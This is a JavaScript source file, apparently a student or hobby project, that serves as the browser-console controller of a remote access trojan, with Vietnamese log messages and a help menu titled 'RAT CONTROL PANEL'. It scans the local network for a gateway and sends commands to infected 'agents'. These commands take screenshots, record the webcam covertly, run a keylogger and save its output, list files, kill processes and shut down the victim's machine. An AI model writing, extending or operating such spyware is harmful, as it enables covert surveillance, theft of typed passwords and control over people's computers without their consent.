import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';
import { GatewayDiscovery } from './modules/discovery.js';
import { LanScanner } from './modules/scanner.js';
import { DataFormatter, MediaPreview, KeylogManager } from './modules/utils.js';

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    apps: [],
    processes: [],
    currentTarget: 'ALL'
};

const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00; font-family: monospace;'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000; font-weight: bold;'),
    warn: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ffff00;'),
    info: (msg) => console.log(`%c${msg}`, 'color: cyan; font-weight: bold;'),
    updateAgentList: (agents) => {
        console.group("=== DANH SÁCH AGENT ONLINE ===");
        console.table(agents);
        console.groupEnd();
    },
    renderList: (title, data) => {
        console.group(`=== ${title} ===`);
        console.table(data);
        console.groupEnd();
    },
    renderFileList: (path, files, count) => {
        console.group(`%c=== FILE LIST: ${path} (${count} items) ===`, 'color: #3b82f6; font-weight: bold;');
        if (files && files.length > 0) {
            console.table(files.map(f => ({
                Name: f.name,
                Type: f.type,
                Size: f.size > 0 ? `${(f.size / 1024).toFixed(2)} KB` : '-',
                Modified: f.modified || '-',
                Permissions: f.permissions || '-',
                'Is Dir': f.isDirectory ? '📁' : '📄'
            })));
            
            console.log('%cNavigation:', 'color: #22c55e; font-weight: bold;');
            console.log('  - listFiles("path/to/folder") - List files in folder');
            console.log('  - listFiles("..") - Go to parent directory');
            console.log('  - Click on directory name to navigate');
        } else {
            console.log('%cEmpty directory or access denied', 'color: #ef4444;');
        }
        console.groupEnd();
    }
};

let autoConnectState = {
    hasTriedDiscovery: false,
    isConnecting: false,
    reconnectAttempts: 0,
    maxReconnectAttempts: 5,
    lastReconnectTime: 0,
    reconnectDelay: 5000 // 5 seconds
};

const gateway = new Gateway({
    onConnected: () => {
        ui.log("System", "Đã kết nối tới Gateway! Đang đăng nhập tự động...");
        appState.isConnected = true;
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false;
        autoConnectState.reconnectAttempts = 0; // Reset on successful connection
        
        if (gateway.ws && gateway.ws.url) {
            const url = new URL(gateway.ws.url);
            appState.lastConnectedHost = url.hostname;
        }
        
        setTimeout(() => {
            gateway.authenticate();
        }, 100);
    },
    onDisconnected: () => {
        ui.warn("System", "Mất kết nối Gateway.");
        appState.isConnected = false;
        appState.agents = [];
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false;
        
        // Prevent reconnect loop
        autoConnectState.reconnectAttempts++;
        const now = Date.now();
        const timeSinceLastReconnect = now - autoConnectState.lastReconnectTime;
        
        if (autoConnectState.reconnectAttempts > autoConnectState.maxReconnectAttempts) {
            ui.error("System", `Đã thử kết nối lại ${autoConnectState.maxReconnectAttempts} lần. Dừng auto-reconnect.`);
            ui.info("System", "Để kết nối lại, gọi: reconnect() hoặc gateway.connect('IP', 8082)");
            return;
        }
        
        // Wait at least reconnectDelay before attempting reconnect
        const delay = Math.max(0, autoConnectState.reconnectDelay - timeSinceLastReconnect);
        
        setTimeout(() => {
            if (!appState.isConnected && !autoConnectState.isConnecting) {
                autoConnectState.lastReconnectTime = Date.now();
                ui.info("System", `Đang thử kết nối lại... (${autoConnectState.reconnectAttempts}/${autoConnectState.maxReconnectAttempts})`);
                autoConnect();
            }
        }, delay);
    },
    onAuthSuccess: () => {
         ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
         setTimeout(() => {
             gateway.refreshAgents();
         }, 500);
    },
    onAgentListUpdate: (agentList) => {
        ui.log("System", `Tìm thấy ${agentList.length} Agent đang hoạt động.`);
        appState.agents = agentList; // Lưu vào state toàn cục
    
        // Gọi hàm cập nhật của scripts.js
        if (typeof window.updateAgentListFromGateway === 'function') {
            window.updateAgentListFromGateway(agentList);
        }
    },
    onScreenshot: (base64Data, agentId) => {
        ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
        // MediaPreview will handle display automatically via gateway.js
    },
    onCamera: (videoData, agentId) => {
        ui.log("Spy", `Nhận video từ ${agentId}`);
        // MediaPreview will handle display automatically via gateway.js
    },
    onKeylog: (keyData, agentId) => {
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value += keyData;
            keylogPanel.scrollTop = keylogPanel.scrollHeight;
        }
        console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
    },
    onAppListUpdate: (appList) => {
        ui.log("System", `Cập nhật danh sách App: ${appList.length} ứng dụng.`);
        appState.apps = appList;
    },
    onProcessListUpdate: (processList) => {
        ui.log("System", `Cập nhật danh sách Process: ${processList.length} tiến trình.`);
        appState.processes = processList;
    },
    onMessage: (msg) => {
        console.log("Raw Msg: ", msg);
    },
    onError: (err) => {
        ui.error("Main", err);
    }
});

window.ui = ui;
window.gateway = gateway;
window.appState = appState;

// Expose refreshAgentList function immediately
window.refreshAgentList = () => {
    if (gateway && gateway.ws && gateway.ws.readyState === WebSocket.OPEN) {
        if (gateway.isAuthenticated) {
            console.log('[Refresh] Đang làm mới danh sách agent...');
            gateway.refreshAgents();
        } else {
            console.warn('[Refresh] Chưa authenticated. Đang đợi...');
            gateway.authenticate();
        }
    } else {
        console.warn('[Refresh] Gateway chưa kết nối. Đang thử kết nối...');
        autoConnect();
    }
}; 

window.help = () => {
    console.clear();
    console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
    
    console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
    console.log("getAgentList()    - fetch agent list")
    console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
    console.log("discover()        - Kết nối đến Gateway (IP tĩnh từ config)");
    console.log("scan()            - Quét mạng LAN tìm IP Server (TCP scan)");
    console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
    console.log("whoami()          - Lấy tên máy của mục tiêu");
    console.groupEnd();

    console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
    console.log("screenshot()      - Chụp ảnh màn hình (hiển thị preview)");
    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5, hiển thị preview)");
    console.log("startKeylog()     - Bắt đầu nhận keylog");
    console.log("stopKeylog()      - Dừng keylog");
    console.log("saveKeylog(name)  - Lưu keylog vào file .txt và xóa trên màn hình");
    console.log("clearKeylog()     - Xóa keylog trên màn hình");
    console.groupEnd();

    console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
    console.log("listApps()        - Xem danh sách ứng dụng đã cài");
    console.log("findApp(query)    - Tìm kiếm app theo tên/path/publisher");
    console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
    console.log("stopApp(id)       - Tắt ứng dụng theo ID");
    console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
    console.log("findProc(query)   - Tìm kiếm process theo tên/PID/user");
    console.log("startProc(id)     - (Ít dùng) Chạy process");
    console.log("stopProc(id)      - Kill process theo PID");
    console.groupEnd();

    console.group("%c4. FILE SYSTEM", "color: #f59e0b");
    console.log("listFiles(path)   - List files trong thư mục (VD: listFiles('C:\\\\') hoặc listFiles('/home'))");
    console.log("listFiles()       - List files thư mục hiện tại (mặc định)");
    console.groupEnd();

    console.group("%c5. KHÁC", "color: #eab308");
    console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
    console.log("shutdownAgent()   - Tắt máy nạn nhân");
    console.log("restartAgent()   - Tắt máy nạn nhân");
    console.log("help()            - Xem lại bảng này");
    console.log("demoFileList()    - Demo file list commands");
    console.groupEnd();
    
    return "Hãy bắt đầu bằng lệnh: connect('localhost')";
};

async function autoConnect() {
    if (autoConnectState.isConnecting || appState.isConnected) {
        return;
    }
    
    autoConnectState.isConnecting = true;
    ui.info(`[Auto] Đang kết nối đến Gateway: ${CONFIG.GATEWAY_IP}:${CONFIG.GATEWAY_PORT}...`);
    
    try {
        await discovery.discover((ip, port) => {
            ui.log("Auto", `Kết nối đến Gateway: ${ip}:${port}`);
            gateway.connect(ip, port);
        }, (progress) => {
            if (progress) {
                ui.info(`[Auto] ${progress}`);
            }
        });
    } catch (error) {
        ui.error("Auto", `Connection error: ${error}`);
        autoConnectState.isConnecting = false;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    window.help();
    autoConnect();
});

window.getAgentList = () => {
    gateway.refreshAgents();
}

window.auth = () => {
    if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
        ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
        return;
    }
    gateway.authenticate();
};

const scanner = new LanScanner();
const discovery = new GatewayDiscovery();

window.scan = () => {
    ui.info("[Main] Đang quét mạng (192.168.1.x)...");
    scanner.scan("192.168.1.", (foundIp) => {
        ui.log("Scanner", `Tìm thấy server tại: ${foundIp}`);
        gateway.connect(foundIp);
        setTimeout(() => gateway.authenticate(), 500);
    });
};

window.discover = () => {
    ui.info("[Discovery] Đang tìm Gateway...");
    discovery.discover((ip, port) => {
        ui.log("Discovery", `Tìm thấy Gateway: ${ip}:${port}`);
        gateway.connect(ip, port);
        setTimeout(() => gateway.authenticate(), 500);
    }, (progress) => {
        if (progress) ui.info(`[Discovery] ${progress}`);
    });
};

window.reconnect = () => {
    ui.info("[Main] Đang kết nối lại...");
    // Reset reconnect attempts to allow manual reconnect
    autoConnectState.reconnectAttempts = 0;
    autoConnectState.lastReconnectTime = 0;
    autoConnect();
};

window.setTarget = (agentId) => {
    appState.currentTarget = agentId;
    gateway.setTarget(agentId);
    ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
}

window.listApps = () => gateway.fetchAppList();
window.startApp = (id) => gateway.startApp(id);
window.stopApp = (id) => gateway.killApp(id);
window.findApp = (query) => {
    if (!gateway.appsList || gateway.appsList.length === 0) {
        ui.warn("CMD", "Chưa có danh sách app. Gọi listApps() trước.");
        return [];
    }
    const results = DataFormatter.searchApps(gateway.appsList, query);
    ui.renderList(`SEARCH APPS: "${query}"`, results);
    return results;
};

window.listProcs = () => gateway.fetchProcessList();
window.startProc = (id) => gateway.startProcess(id);
window.stopProc = (id) => gateway.killProcess(id);
window.findProc = (query) => {
    if (!gateway.processesList || gateway.processesList.length === 0) {
        ui.warn("CMD", "Chưa có danh sách process. Gọi listProcs() trước.");
        return [];
    }
    const results = DataFormatter.searchProcesses(gateway.processesList, query);
    ui.renderList(`SEARCH PROCESSES: "${query}"`, results);
    return results;
};

window.listFiles = (path = "") => {
    if (path === "") {
        path = "/";
    }
    ui.info(`[CMD] Listing files in: ${path}`);
    gateway.listFiles(path);
};

window.whoami = () => gateway.send(CONFIG.CMD.WHOAMI, "");
window.echo = (text) => gateway.send(CONFIG.CMD.ECHO, text);
window.screenshot = () => gateway.send(CONFIG.CMD.SCREENSHOT, "");
window.recordCam = (duration = 5) => gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));

window.startKeylog = () => {
    ui.info("[CMD] Bật Keylogger...");
    gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({interval: 0.5}));
};
window.stopKeylog = () => {
    ui.info("[CMD] Tắt Keylogger...");
    gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
};
window.saveKeylog = (filename) => {
    const keylogContent = KeylogManager.getKeylogContent();
    if (!keylogContent || !keylogContent.trim()) {
        ui.warn("CMD", "Không có keylog để lưu. Hãy bật keylog trước.");
        return;
    }
    const savedFile = KeylogManager.saveKeylogToFile(keylogContent, filename);
    ui.log("CMD", `Đã lưu keylog vào file: ${savedFile}`);
};
window.clearKeylog = () => {
    KeylogManager.clearKeylog();
    ui.log("CMD", "Đã xóa keylog trên màn hình.");
};

window.shutdownAgent = () => {
    if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
        gateway.send(CONFIG.CMD.SHUTDOWN, "");
    }
}

window.restartAgent = () => {
    if (confirm("RESTART?")) {
        gateway.send(CONFIG.CMD.RESTART, "");
    }
}

window.demoFileList = () => {
    console.clear();
    console.log("%c=== DEMO FILE LIST ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px;");
    console.log("%cTesting file list functionality...", "color: cyan;");
    console.log("");
    
    console.log("%c1. List root directory:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('/')");
    console.log("");
    
    console.log("%c2. List Windows C: drive:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('C:\\\\')");
    console.log("");
    
    console.log("%c3. List home directory:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('~') or listFiles(process.env.HOME)");
    console.log("");
    
    console.log("%c4. Navigate to subfolder:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('/home/username')");
    console.log("   listFiles('C:\\\\Users\\\\Username')");
    console.log("");
    
    console.log("%cNow try:", "color: #22c55e; font-weight: bold;");
    console.log("   listFiles('/')");
    console.log("");
    
    return "Demo ready! Try: listFiles('/')";
}
